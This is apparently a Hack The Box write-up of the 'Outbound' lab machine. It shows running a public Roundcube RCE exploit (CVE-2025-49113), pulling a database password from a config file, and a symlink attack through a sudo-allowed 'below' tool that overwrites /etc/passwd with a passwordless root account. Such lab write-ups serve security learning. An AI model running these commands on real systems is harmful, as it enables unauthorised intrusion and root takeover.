---
title: Hack The Box - Outbound (2025) Writeup
date: 2025-07-16 12:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Outbound
  - CVE-2025-49113
  - Linux
  - Privilege Escalation
  - Symlink Attack
---

# Outbound (Hack The Box) - 2025

A step-by-step writeup for the Hack The Box machine "Outbound" (2025). This box involved web exploitation, database discovery, and a creative privilege escalation using a symlink attack.

---

## Recon

Initial Nmap scan:

```bash
nmap -A 10.10.11.77
```

Results:
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

- Only SSH and HTTP are open.
- The web server is running nginx on Ubuntu.

---

## Web Exploitation (CVE-2025-49113 - Roundcube RCE)

After browsing the web service, I discovered a Roundcube Webmail instance. Research revealed a recent RCE vulnerability:

- **CVE-2025-49113**: Authenticated Remote Code Execution via deserialization in Roundcube 1.5.0-1.6.10.

### Exploit Steps

1. Used valid credentials to log in to Roundcube.
2. Ran the public exploit:

```bash
php CVE-2025-49113.php http://outbound.htb/roundcube/ <username> <password> "id"
```

3. Gained remote code execution as the web server user.

---

## Database Discovery

With RCE, I explored the server and found the Roundcube config:

```
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

- Used these credentials to access the MySQL database.
- Enumerated tables:
  - users, session, contacts, etc.

---

## Privilege Escalation (Symlink Attack with below)

After getting a shell as user `jacob`, I checked for sudo privileges:

```bash
sudo -l
```

Found:
```
jacob can run /usr/bin/below as root without a password.
```

### The Exploit

- The `below` tool writes logs to `/var/log/below/error_root.log`, which is world-writable.
- By deleting the log and symlinking it to `/etc/passwd`, I could overwrite the password file.

#### Steps:

```bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
sudo /usr/bin/below
cp /tmp/fakepass /var/log/below/error_root.log
su pwn
```

- This created a new root user (`pwn`) with no password.
- Switched to root and grabbed the flag:

```bash
cat /root/root.txt
```

---

## Summary

- **Recon**: Found HTTP/SSH, discovered Roundcube.
- **Web Exploitation**: Used CVE-2025-49113 for RCE.
- **Database**: Extracted credentials from config.
- **Privilege Escalation**: Symlinked log to `/etc/passwd` via `below` for root.

---

> This writeup is for educational purposes only. Do not attempt these techniques on systems you do not own or have explicit permission to test. 